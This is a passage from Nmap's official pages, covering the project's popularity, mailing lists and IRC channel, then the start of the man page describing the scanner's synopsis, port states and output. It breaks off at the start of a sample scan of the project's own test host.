                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org
